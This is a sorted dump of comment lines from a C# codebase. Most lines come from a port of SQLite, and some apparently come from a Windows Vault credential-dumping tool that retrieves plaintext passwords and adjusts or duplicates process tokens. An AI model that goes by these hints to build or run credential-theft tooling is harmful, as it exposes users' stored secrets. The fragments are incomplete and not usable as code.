+//  p = pSpace;
+//  p = sqlite3Malloc(nByte);
+//  p++;
+//  p--;
+//  p.aOp = pNew;
+//  p.db = db;
+//  p.flags = UNPACKED_NEED_FREE | UNPACKED_NEED_DESTROY;
+//  p.iBatch = 0;
+//  p.isSorted = 1;
+//  p.nFresh = (u16)((N - ROUND8(sizeof(*p)))/sizeof(struct RowSetEntry));
+//  p.pChunk = 0;
+//  p.pEntry = 0;
+//  p.pFresh =(struct RowSetEntry*)(ROUND8(sizeof(*p)) + (char*)p);
+//  p.pLast = 0;
+//  p.pTree = 0;
+//  p.rc = SQLITE_NOMEM;
+//  p.zText[p.nChar] = 0;
+//  p1--;
+//  pAccum->mallocFailed = 1;
+//  pCheck.mallocFailed = 1;
+//  pCtx.isError = SQLITE_ERROR;
+//  pData.flags &= ~MEM_Dyn;
+//  pData.flags |= MEM_Ephem;
+//  pData.zMalloc = null;
+//  pDest.flags &= ~( MEM_Ephem | MEM_Static );
+//  pDest.flags |= MEM_Term;
+//  pDest.z = sMem.z;
+//  pDest.zMalloc = sMem.zMalloc;
+//  pEnd.zMalloc = 0;
+//  pFile->lastErrno = (u32)GetLastError();
+//  pFile->lastErrno = GetLastError();
+//  pFile->lastErrno = error;
+//  pFile->sharedLockByte = (u16)((lk & 0x7fffffff)%(SHARED_SIZE - 1));
+//  pFile.lastErrno = (u32)GetLastError();
+//  pIdx = -1;
+//  pKeyInfo.aSortOrder = (unsigned char*)&pKeyInfo.aColl[nField];
+//  pMem->enc = desiredEnc;
+//  pMem->n = (int)(z - zOut);
+//  pMem.flags = MEM_Null;
+//  pMem.z[pMem->n+1] = 0;
+//  pMem.z[pMem->n] = 0;
+//  pNew = null;
+//  pNew = standin;
+//  pParse.nVarExprAlloc*sizeof(pParse.apVarExpr[0])
+//  pParse.rc = SQLITE_NOMEM;
+//  pPayload = &pCell[nHeader];
+//  pPrior = &pCell[info.iOverflow];
+//  pStart = 0;
+//  pStart = pBuf;
+//  pStart = sqlite3Malloc( sz * cnt );
+//  pWC.a = pOld;
+//  p[0] = nByte;
+//  paCol = null;
+//  pnCol = 0;
+//  pnErr = 1;
+//  pnErr = sCheck.nErr+1;
+//  ptr[0] = ptr[-2];
+//  ptr[0] = ptr[2];
+//  ptr[1] = ptr[-1];
+//  ptr[1] = ptr[3];
+//  public u32 byte_0_3;
+//  public u32 byte_12_15;
+//  public u32 byte_4_7;
+//  public u32 byte_8_11;
+//  r++;
+//  rc = CloseHandle(pFile.h);
+//  rc = SQLITE_ERROR;
+//  rc = SQLITE_NOMEM;
+//  rc = sqlite3VdbeMemMakeWriteable(pMem);
+//  ret = null;
+//  return (int)(zOut - zStart);
+//  return (pNew ? SQLITE_OK : SQLITE_NOMEM);
+//  return (void*)h;
+//  return (void*)p;
+//  return 0;
+//  return 1;
+//  return SQLITE_BUSY;
+//  return SQLITE_ERROR;
+//  return SQLITE_IOERR;
+//  return SQLITE_IOERR_FSTAT;
+//  return SQLITE_IOERR_TRUNCATE;
+//  return SQLITE_MISUSE;
+//  return SQLITE_NOMEM;
+//  return SQLITE_OK;
+//  return WRC_Abort;
+//  return columnName(
+//  return compare2pow63(zNum)<neg;
+//  return dummy;
+//  return null;
+//  return out;
+//  return p ? p->nByte : 0;
+//  return pArray;
+//  return pNew;
+//  return p[0];
+//  return rc;
+//  return u.r;
+//  return val;
+//  return z;
+//  return zFilename;
+//  return zFilenameMbcs;
+//  return zFilenameUtf8;
+//  return zMbcsFilename;
+//  return zNew;
+//  return zWideFilename;
+//  return;
+//  return;   /* A malloc must have failed */
+//  sInfo.dwOSVersionInfoSize = sInfo.Length;
+//  size_t n;
+//  sizeof(sqlite3Prng)
+//  sqlite3 * (*db_handle)(sqlite3_stmt*);
+//  sqlite3 *(*context_db_handle)(sqlite3_context*);
+//  sqlite3 **ppDb          /* OUT: SQLite db handle */
+//  sqlite3 *db;
+//  sqlite3 db;
+//  sqlite3* db = sqlite3_context_db_handle( context );
+//  sqlite3BeginBenignMalloc();
+//  sqlite3BtreeLeave(p);
+//  sqlite3DeleteTable( ref pTab );
+//  sqlite3EndBenignMalloc();
+//  sqlite3GlobalConfig.szScratch = ROUNDDOWN8(sqlite3GlobalConfig.szScratch-4);
+//  sqlite3MallocAlarm(nBytes);
+//  sqlite3PageFree(ref pFree);
+//  sqlite3StrAccumReset(sCheck.errMsg);
+//  sqlite3VdbeMemRelease( ctx.s );
+//  sqlite3_blob **ppBlob
+//  sqlite3_blob **ppBlob   /* Handle for accessing the blob returned here */
+//  sqlite3_file pFile = (sqlite3_file)id;
+//  sqlite3_file pFile = (sqlite3_file*)id;
+//  sqlite3_free(ref pKey);
+//  sqlite3_int64 (*memory_highwater)(int);
+//  sqlite3_int64 (*memory_used)(void);
+//  sqlite3_int64 p = (sqlite3_int64*)pPrior;
+//  sqlite3_int64 p;
+//  sqlite3_mutex *(*mutex_alloc)(int);
+//  sqlite3_mutex *(*xMutexAlloc)(int);
+//  sqlite3_mutex *sqlite3MutexAlloc(int);
+//  sqlite3_mutex_enter(db.mutex);
+//  sqlite3_mutex_enter(mem0.mutex);
+//  sqlite3_mutex_leave(db->mutex);
+//  sqlite3_mutex_leave(db.mutex);
+//  sqlite3_mutex_leave(mem0.mutex);
+//  sqlite3_mutex_methods *sqlite3DefaultMutex(void);
+//  sqlite3_os_type = sInfo.dwPlatformId == VER_PLATFORM_WIN32_NT ? 2 : 1;
+//  sqlite3_query_plan[--nQPlan] = 0;
+//  sqlite3_result_error_nomem( context );
+//  sqlite3_value[] argv
+//  sqlite3_vfs *(*vfs_find)(const char*);
+//  sqlite3_vfs *pNext;      /* Next registered VFS */
+//  sqlite3_vtab *pVtab;      /* Virtual table of this cursor */
+//  sqlite_int64  (*last_insert_rowid)(sqlite3*);
+//  sqlite_int64  (*value_int64)(sqlite3_value*);
+//  static const VdbeOpList openBlob[] = {
+//  static int sqlite3VdbeAddOp4(
+//  staticFlag = EP_Static;
+//  string zName;   /* Name of the table */
+//  struct sqlite3_index_constraint {
+//  struct sqlite3_index_constraint_usage {
+//  struct sqlite3_index_orderby {
+//  sz = 0;
+//  t = u.i[0];
+//  t = x.iJD/1000 - 21086676*(i64)10000;
+//  testcase( nByte == db->aLimit[SQLITE_LIMIT_LENGTH] );
+//  testcase( nByte == db->aLimit[SQLITE_LIMIT_LENGTH] + 1 );
+//  typedef SQLITE_INT64_TYPE sqlite_int64;
+//  typedef __int64 sqlite_int64;
+//  typedef long long int sqlite_int64;
+//  typedef unsigned SQLITE_INT64_TYPE sqlite_uint64;
+//  typedef unsigned __int64 sqlite_uint64;
+//  typedef unsigned long long int sqlite_uint64;
+//  u.i[0] = u.i[1];
+//  u.i[1] = t;
+//  u.r = in;
+//  u32 c;
+//  u32 t;
+//  u8 b1 = *(u8 *)pMem.z;
+//  u8 b2 = *(((u8 *)pMem.z) + 1);
+//  u8 isWriteLock;      /* True for write lock.  False for a read lock */
+//  u8 temp;
+//  union {
+//  unsigned char *zOut = zIn;
+//  unsigned char *zStart = zIn;
+//  v = v*10 + c - '0';
+//  v.rc = SQLITE_NOMEM;
+//  va_list ap;
+//  void  (*free)(void*);
+//  void  (*free_table)(char**result);
+//  void  (*interruptx)(sqlite3*);
+//  void  (*result_null)(sqlite3_context*);
+//  void  (*thread_cleanup)(void);
+//  void (*mutex_enter)(sqlite3_mutex*);
+//  void (*mutex_free)(sqlite3_mutex*);
+//  void (*mutex_leave)(sqlite3_mutex*);
+//  void (*result_error_nomem)(sqlite3_context*);
+//  void (*result_error_toobig)(sqlite3_context*);
+//  void (*soft_heap_limit)(int);
+//  void (*xDestroy)(sqlite3_pcache*);
+//  void (*xFinal)(sqlite3_context*)
+//  void (*xFree)(void*);          /* Free a prior allocation */
+//  void (*xMutexEnter)(sqlite3_mutex *);
+//  void (*xMutexFree)(sqlite3_mutex *);
+//  void (*xMutexLeave)(sqlite3_mutex *);
+//  void (*xShutdown)(void*);
+//  void (*xShutdown)(void*);      /* Deinitialize the memory allocator */
+//  void * (*user_data)(sqlite3_context*);
+//  void *(*malloc)(int);
+//  void *(*xMalloc)(int);         /* Memory allocation function */
+//  void **aNew;
+//  void *pAppData;                /* Argument to xInit() and xShutdown() */
+//  void *pAppData;          /* Pointer to application-specific data */
+//  void *pArg;
+//  void *pClientData          /* Client data for xCreate/xConnect */
+//  void *pNotifyArg                            /* Argument to pass to xNotify */
+//  void *pUserData
+//  void *sqlite3TestTextToPtr(const char*);
+//  void *zConverted = convertUtf8Filename(zFilename);
+//  void disable_simulated_io_errors(void);
+//  void enable_simulated_io_errors(void);
+//  void pNew = 0;
+//  void sqlite3AutoincrementBegin(Parse *pParse);
+//  void sqlite3AutoincrementEnd(Parse *pParse);
+//  void sqlite3PagerRefdump(Pager*);
+//  void sqlite3VdbeIOTraceSql(Vdbe);
+//  void sqlite3VdbePrintSql(Vdbe*);
+//  void(*)(DbPage*)
+//  void(*xDestroy)(void*)
+//  void(*xDestroy)(void*)     /* Module destructor function */
+//  void*
+//  while ( ( *zIn & 0xc0 ) == 0x80 )
+//  while ( ( zJournal - zMasterJournal ) < nMasterJournal )
+//  while(
+//  while( zIn<zTerm ){
+//  while( zIn[0] ){
+//  z = sqlite3ErrStr( SQLITE_NOMEM );
+//  z.Append( zMod.Substring( n ).ToLower() );
+//  zAlloc = pzBuffer;
+//  zBuf[N] = randomu8();
+//  zBuf[j] = (char)zChars[ ((unsigned char)zBuf[j])%(sizeof(zChars)-1) ];
+//  zBuf[j] = 0;
+//  zConverted = utf8ToMbcs(zFilename);
+//  zConverted = utf8ToUnicode(zFilename);
+//  zCsr = p.pFree;
+//  zEnd = &zCsr[nByte];
+//  zFilename = malloc( nByte );
+//  zFilenameMbcs = unicodeToMbcs(zTmpWide);
+//  zFilenameUtf8 = unicodeToUtf8(zTmpWide);
+//  zIn = (u8*)pMem.z;
+//  zJournal = zMasterJournal;
+//  zMasterJournal = sqlite3Malloc((int)nMasterJournal + nMasterPtr + 1);
+//  zMasterJournal[nMasterJournal] = 0;
+//  zMasterPtr = &zMasterJournal[nMasterJournal+1];
+//  zMbcsFilename = malloc( nByte*sizeof(zMbcsFilename[0]) );
+//  zMulti = unicodeToUtf8(zWidePath);
+//  zNum++;
+//  zNum++;   /* Skip leading zeros.  Ticket #2454 */
+//  zTerm = &zIn[pMem->n&~1];
+//  zTmpWide = mbcsToUnicode(zFilename);
+//  zTmpWide = utf8ToUnicode(zFilename);
+//  zUtf8 = sqlite3_win32_mbcs_to_utf8(zMbcsPath);
+//  zWideFilename = malloc( nChar*sizeof(zWideFilename[0]) );
+//  {
+//  }
+//  }                                                                   \
+//  }                                                                 \
+//  }                                                    \
+//  } *aConstraint;            /* Table of WHERE clause constraints */
+//  } *aConstraintUsage;
+//  } *aOrderBy;               /* The ORDER BY clause */
+//  } u;
+//  } while( nAttempt<5 && rc==SQLITE_SCHEMA );
+//  };
+//  }else if( rc==SQLITE_OK ){
+//  }else{
+//  }else{                                                                       \
+//  }else{                                                            \
+//  }else{                                               \
+// != INVALID_FILE_ATTRIBUTES;
+// !rc
+// #define P4_KEYINFO_HANDOFF (-16)
+// #define P4_KEYINFO_STATIC  (-17)
+// &data[cellOffset + i * 2];
+// ( pElem = sqliteHashFirst( pHash ) ; pElem ; pElem = sqliteHashNext( pElem ) )
+// ( sqlite3PagerGetExtra( pDestPg ) )[0] = 0;
+// (BtCursor*)&pMem.z[sizeof( VdbeCursor ) + 2 * nField * sizeof( u32 )];
+// (Expr*)zAlloc;
+// (PCache1*)sqlite3_malloc( sizeof( PCache1 ) );
+// (PgFreeslot)p;
+// (PgFreeslot)pBuf;
+// (PgHdr1**)sqlite3_malloc( sizeof( PgHdr1* ) * nNew );
+// (Schema*)sqlite3MallocZero(Schema).Length;
+// (VdbeCursor*)pMem.z;
+// (WhereClause )((u8 )pWInfo)[nByteWInfo];
+// (char *)sqlite3Malloc(pIdx->nColumn+2);
+// (char*)( &pIndex->aSortOrder[nCol] );
+// (char*)( &pIndex.zName[nName + 1] );
+// (i64)( (((u64)0x7fffffff)<<32) | (u64)0xffffffff )
+// (sqlite3_backup)sqlite3_malloc( sizeof( sqlite3_backup ) );
+// (sqlite3_file*)( ( (u8*)pMaster ) + pVfs.szOsFile );
+// (sqlite3_file*)sqlite3MallocZero( pVfs.szOsFile * 2 );
+// (sqlite_u3264)0 ); }
+// (u32*)&pMem.z[sizeof( VdbeCursor )];
+// (u8 *)pOut.z;
+// (u8*)&(pKey.aColl[nCol]);
+// (u8*)&pStr2->token.z[nPattern-1];
+// (void*)p;
+// * !SQLITE_OMIT_ANALYZE) */
+// * !SQLITE_OMIT_BLOB_LITERAL || SQLITE_HAS_CODEC */
+// * !SQLITE_OMIT_CHECK) */
+// * !SQLITE_OMIT_DATETIME_FUNCS) */
+// * !SQLITE_OMIT_FOREIGN_KEY) */
+// * !SQLITE_OMIT_TRACE  && SQLITE_ENABLE_IOTRACE */
+// * !SQLITE_OMIT_TRIGGER */
+// * !SQLITE_OMIT_TRIGGER) */
+// * !SQLITE_OMIT_VIEW) || !SQLITE_OMIT_VIRTUALTABLE) */
+// * #if !SQLITE_OMIT_INCRBLOB */
+// * #if !SQLITE_OMIT_SUBQUERY */
+// * #if !SQLITE_OMIT_TRIGGER */
+// * Give no warning for recursive triggers.  Just do not do them */
+// * NDEBUG */
+// * SQLITE_ALTER_TABLE */
+// * SQLITE_AMALGAMATION */
+// * SQLITE_DEBUG */
+// * SQLITE_ENABLE_COLUMN_METADATA */
+// * SQLITE_MUTEX_W32 */
+// * SQLITE_OMIT_ANALYZE */
+// * SQLITE_OMIT_ATTACH */
+// * SQLITE_OMIT_AUTOINCREMENT */
+// * SQLITE_OMIT_CAST */
+// * SQLITE_OMIT_COMPLETE */
+// * SQLITE_OMIT_COMPOUND_SELECT */
+// * SQLITE_OMIT_DECLTYPE */
+// * SQLITE_OMIT_DISKIO */
+// * SQLITE_OMIT_EXPLAIN */
+// * SQLITE_OMIT_FLAG_PRAGMAS */
+// * SQLITE_OMIT_FLOATING_POINT */
+// * SQLITE_OMIT_INTEGRITY_CHECK */
+// * SQLITE_OMIT_MEMORYDB */
+// * SQLITE_OMIT_PAGER_PRAGMAS */
+// * SQLITE_OMIT_PRAGMA
+// * SQLITE_OMIT_SCHEMA_PRAGMAS */
+// * SQLITE_OMIT_SCHEMA_VERSION_PRAGMAS */
+// * SQLITE_OMIT_SHARED_CACHE */
+// * SQLITE_OMIT_SUBQUERY */
+// * SQLITE_OMIT_TRACE */
+// * SQLITE_OMIT_TRIGGER */
+// * SQLITE_OMIT_UTF16 */
+// * SQLITE_OMIT_VACUUM && SQLITE_OMIT_ATTACH */
+// * SQLITE_OMIT_VIEW */
+// * SQLITE_OMIT_VIRTUALTABLE */
+// * SQLITE_OMIT_XFER_OPT */
+// * SQLITE_OS_WIN */
+// * SQLITE_OS_WINCE */
+// * SQLITE_PAGER_PRAGMAS */
+// * SQLITE_TEST */
+// * This file is used for windows only */
+// * YYERRORSYMBOL is not defined */
+// * YYFALLBACK */
+// * YYWILDCARD */
+// * _BTREE_H_ */
+// * _SQLITE_HASH_H_ */
+// * _SQLITE_OS_H_ */
+// * defined(SQLITE_TEST) || defined(SQLITE_DEBUG) */
+// * if !SQLITE_OMIT_AUTOVACUUM */
+// * if SQLITE_OMIT_LOAD_EXTENSION is defined: */
+// *(void **)(PGHDR1_TO_PAGE(pPage)) = 0;
+// ** Convertion routines
+// +1900;
+// +1;
+// -- Not Running under NT
+// -- overloads ---------------------------------------
+// ----------------------------
+// -2;
+// /* Convert the filename to the system encoding. */
+// </param>
+// </returns>
+// </summary>
+// <returns></returns>
+// <returns>Count of Results</returns>
+// <returns>LastResult</returns>
+// <returns>Result column</returns>
+// <returns>Vdbe</returns>
+// <summary>
+// = (char*)&pTriggerStep[1];
+// = a;
+// = p.aOp[p.nOp - 1].zComment;
+// = p.aOp[p.nOp-1].zComment;
+// = pAggInfo.aFunc;
+// = pGB.a;
+// = pNew.u.zToken = (char*)&zAlloc[nNewSize];
+// = pParent.aOvfl[0].pCell;
+// = pSrcList.a;
+// = pTab.aCol;
+// = {0};
+// ADDR(p2);
+// ALTER TABLE ADD COLUMN
+// ALTERNATE FORM for C#
+// ALWAYS() and NEVER() are no-op pass-through macros
+// ALWAYS(x) asserts that x is true. NEVER(x) asserts x is false.
+// ALWAYS(x) is a constant 1.  NEVER(x) is a constant 0.
+// AdjustTokenPrivileges
+// Alternative form for C#
+// Always exists under C#
+// Basic locking strategy for Console/Winform applications
+// Begin fetching vault item...
+// BindInteger
+// BindLong
+// BindText
+// C# -- Replace allocation with individual Dims
+// CONSTRUCTOR
+// CREATE_NEW;
+// Cannot happen under C#
+// Check on the sCollMap
+// Check value of pTabItem[0].jointype
+// Closes opened database.
+// Closes statement
+// Constants that are going to be used during our procedure.
+// Constructor
+// Copy the Data Locally
+// Create dictionary to translate Guids to human readable elements
+// Creates new instance of SQLiteBase class with no database attached.
+// Creates new instance of SQLiteDatabase class and opens database with given name.
+// Creates new instance of SQLiteVdbe class by compiling a statement
+// DESC indices.  Boolean constants
+// DWORD attr;
+// Debug.Assert( pPgnoNext);
+// Debug.Assert(&((char*)&likeInfoAlt)[1] == (char*)&likeInfoAlt.matchOne);
+// Debug.Assert(&((char*)&likeInfoAlt)[2] == (char*)&likeInfoAlt.matchSet);
+// Debug.Assert((char*)&likeInfoAlt == (char*)&likeInfoAlt.matchAll);
+// Debugging version of system malloc()
+// Default Value
+// DuplicateToken
+// ENC( pParse.db );
+// ENC( pParse.db );   /* The database encoding */
+// ENC(db);
+// ENC(pParse.db);
+// Example (C#)
+// Execute statement
+// Execute the statement
+// Executes query that does return something (e.g. SELECT).
+// FILE_ATTRIBUTE_NORMAL;
+// FILE_ATTRIBUTE_TEMPORARY
+// FILE_FLAG_RANDOM_ACCESS;
+// FILE_SHARE_READ | FILE_SHARE_WRITE;
+// Fetch all items within Vault
+// Fetch the credential from the authenticator element
+// Field Info retrieval
+// For each vault item...
+// GENERIC_READ | GENERIC_WRITE;
+// GENERIC_READ;
+// General Information about an assembly is controlled through the following 
+// GetCurrentProcess
+// GetFileAttributesW( (WCHAR*)zConverted );
+// Had to lookup appropriate sequence
+// IV 12 bytes
+// IdChar(z[iOffset+i]) ){
+// Indicates successful fetch
+// Integer pointer always exists Debug.Assert( pOp.p4.pI64 != 0 );
+// Klude to show prNotFound not available
+// Locking strategy for Medium Trust. It uses the same trick used in the native code for WIN_CE
+// LookupPrivilegeValue
+// Luid Structure Definition
+// MINIMAL STRUCTURE
+// Minimum Size = (2 bytes of Header  or (4) Child Pointer) + (maximum of) 9 bytes data
+// NOT USED */
+// Need this since mutex_enter & leave are not MACROS under C#
+// Need to clear all the following variables during each recursion
+// Needs to be u8 for later tests
+// Negative Offset means overflow cells
+// Newer versions have package sid
+// Not NT
+// Not Used --  sizeof( BtCursor );
+// Not needed in C#
+// Not needed in C# // Debug.Assert( pRes != 0 );
+// Not used in C# -- string zExtra;              /* Extra memory used for etTCLESCAPE conversions */
+// Not used under c#
+// Now we create a TOKEN_PRIVILEGES structure with our modifications
+// OPEN_ALWAYS;
+// Open vault block
+// OpenProcess
+// OpenProcessToken
+// Opens database. 
+// Our old state.
+// Overflow Cell
+// Overloads for ap assignments
+// QueryPerformanceCounter(out i);
+// Reflection is unecessary for defining these.
+// Reset statement
+// Reset the statment so it's ready to use again
+// Return Virtual Machine Pointer
+// Return all table names in the ArrayList
+// Return number of colums read
+// Returns Count of Result Rows
+// Returns Result column as Long
+// Returns Result column as Text
+// Returns connection
+// Returns the list of tables in opened database.
+// SQLITE_INT_TO_PTR( regIdxKey );
+// SQLITE_PTR_TO_INT(zP4);
+// SetThreadToken
+// Setting ComVisible to false makes the types in this assembly not visible 
+// Something goes wrong between adding this as a column value and converting to a row value.
+// Stupid datetime
+// Success
+// TODO -
+// TODO --
+// TODO --    sqlite3GlobalConfig.m.xFree(p);
+// TODO -- && pMem.z != pMem.zMalloc )
+// TODO -- Convert PENDING_BYTE_PAGE to inline
+// TODO -- Convert back to inline for speed
+// TODO -- Convert to inline for speed
+// TODO -- Determine if the following Assert is needed under c#
+// TODO -- What do we want to do about this routine?
+// TODO -- func_c
+// TODO --pMem.z = pMem.zMalloc;
+// Testing and debugging use only */
+// Thanks to @tifkin and @harmj0y for pointing out that
+// The following GUID is for the ID of the typelib if this project is exposed to COM
+// This loop is very short -- so only minor performance hit
+// Under C# from the header file
+// Under C# pEType will always exist. No need to test; //
+// Under C# pPgno will always exist. No need to test; //
+// Use normal system malloc()
+// User supplied code
+// VAULT_ELEMENT_TYPE == Double
+// VAULT_ELEMENT_TYPE == GUID
+// VAULT_ELEMENT_TYPE == Int
+// VAULT_ELEMENT_TYPE == Short
+// VAULT_ELEMENT_TYPE == Sid
+// VAULT_ELEMENT_TYPE == String; These are the plaintext passwords!
+// VAULT_ELEMENT_TYPE == Unsigned Int
+// VAULT_ELEMENT_TYPE == Unsigned Short
+// VAULT_ELEMENT_TYPE == bool
+// VVA_ONLY( int nRef = sqlite3PagerRefcount(pPager) );
+// Vault opened successfully! Continue.
+// Version information for an assembly consists of the following four values:
+// Walker Methods
+// We need to create instances of the col cache
+// Work around string pointer
+// adds new integer column to table
+// assert( EIGHT_BYTE_ALIGNMENT(pMem) );
+// associated with an assembly.
+// azCols[nCol];
+// calles SQLite function that executes non-query
+// char*.Length == sizeof(i64);
+// char*.Length == sizeof(long);
+// closes the database if there is one opened
+// cnt.Length;
+// compiled query
+// convertUtf8Filename( zUtf8Name );
+// db.aDb = db.aDbStatic;
+// ditto but with non-NULL defaults
+// do something with pData
+// executes query that select names of all tables in master table of the database
+// expandBlob(pVal);
+// finalize executing this query
+// flags = SQLITE_PTR_TO_INT(sqlite3_user_data(context));
+// for (i = 0; i <= sCheck.nPage; i++) { sCheck.anRef[i] = 0; }
+// free(zConverted);
+// free(zTemp);
+// freeProc(ref pParser);
+// if ( pNextZombie != null ) cp.pNextZombie=pNextZombie.Copy();
+// if ( pSchema != null ) cp.pSchema=pSchema.Copy();
+// if ( piNewColMask != 0 ) piNewColMask |= trigStackEntry.newColMask;
+// if ( piOldColMask != 0 ) piOldColMask |= trigStackEntry.oldColMask;
+// if ( result && negFlag && pNum == Int64.MaxValue  ) result = false;
+// if (pColl != null) pColl += enc - 1;
+// if( aNew==0 ) return;
+// in order to pick the appropriate locking strategy
+// internal allocator #1
+// internal mmap() allocator
+// internal power-of-two allocator
+// len;
+// needs ref
+// opens database 
+// p++)
+// p=pParse.aColCache... p++)
+// pC = c + 1;
+// pCache.apHash[h] = pp.pNext;
+// pFrom++ )
+// pH.htsize = new_size = sqlite3MallocSize(new_ht)/sizeof(struct _ht);
+// pIn1[j]);
+// pInfo.aColl[nExpr];
+// pItem++ )
+// pItem++)
+// pItem[1].jointype
+// pLItem++;
+// pLeft ++
+// pMem++;
+// pNew;
+// pOp[-1].opcode == OP_CollSeq );
+// pOp[-1].p4.pColl;
+// pPager.aSavepoint = aNew;
+// pPager.pTmpSpace );
+// pPayload += n;
+// pSrc += n;
+// pcache Methods
+// placeholder method
+// pointer to database
+// prepare and compile 
+// private function for creating Column Names
+// private function for reading rows and creating table and columns
+// public HANDLE h;            /* Handle for accessing the file */
+// r.aMem = p.aMem[pOp.p3];
+// reads columns one by one
+// reads rows
+// returns number of columns returned by statement
+// returns table
+// set of attributes. Change these attribute values to modify the information
+// sizeof( MemJournal );
+// sizeof( PCache ); }
+// sizeof( PgHdr );
+// sizeof(pid);
+// sizeof(x);
+// sqlite3 db = sqlite3_context_db_handle( context );
+// sqlite3IsNumericAffinity(idx_affinity);
+// sqlite3Malloc( nPathname * 2 );
+// sqlite3Malloc(pC.nData + 2);
+// sqlite3MallocZero(pPager.dbSize / 8 + 1);
+// sqlite3ParserARG_FETCH;
+// sqlite3ParserARG_SDECL                /* A place to hold %extra_argument */
+// sqlite3ParserARG_STORE; /* Suppress warning about unused %extra_argument variable */
+// sqlite3Strlen30(bufpt);
+// sqlite3ValueFree(pVal);
+// sqlite3ValueFree(ref (sqlite3_value)p4);
+// sqlite3_free( ref pBt.pSchema );
+// sqlite3_free( ref pCellKey );
+// sqlite3_free( ref sCheck.anRef );
+// sqlite3_malloc( ( sz + 7 ) / 8 + 1 );
+// sqlite3_malloc( BITVEC_SZ );
+// sqlite3_malloc( sizeof( FileChunk ) );
+// sqlite3_malloc( sizeof( char* ) * res.nAlloc );
+// sqliteHashData( i );
+// sqliteHashData( k );
+// sqliteHashData( p );
+// sqliteHashData( pElem );
+// sqliteHashData( x );
+// sqliteHashData(i);
+// table for result of query
+// this is where it needs to check if it's running in an ASP.Net MediumTrust or lower environment
+// to COM components.  If you need to access a type in this assembly from 
+// u8 pSpace = sqlite3PageMalloc( pCur.pBt.pageSize );
+// use PRIVILEGE_SET_ALL_NECESSARY
+// use SQLITE3_LINK_INT version static int sqlite3_search_count = 0;
+// use SQLITE3_LINK_INT version static sqlite3_sort_count = 0;
+// was unicodeToUtf8(zTemp);
+// which doesn't support LockFileEx as well.
+// while ( sqlite3Isspace( *(u8*)z ) ) z++;
+// while ( sqlite3Isspace( *(u8*)zDate ) ) { zDate++; }
+// will happen on exit; was   free(zConverted);
+// will happen on exit; was   free(zOut);
+// will happen on exit; was   free(zTemp);
+// yyStackEntry[] yymsp = new yyStackEntry[0];            /* The top of the parser's stack */
+// z++;
+// z2++;
+// z;
+// zBuf[k++] = '[';
+// zData[len];
+// zData[szHdr];
+// zDate += 10;
+// zDate += 2;
+// zDate += 5;
+// zDate++;
+// zDate[zIndex] == '\0')
+// zOut += nCopy;
+// zTemp[i++] = ')';
+// zTemp[i++] = '-';
+// z[n - 1] = '\0'; n--; }
+// z[zIndex] == 0;
+// || *zFilename==0) ){
+// }
+[assembly: AssemblyVersion( ""3.6.17.1"" )]"
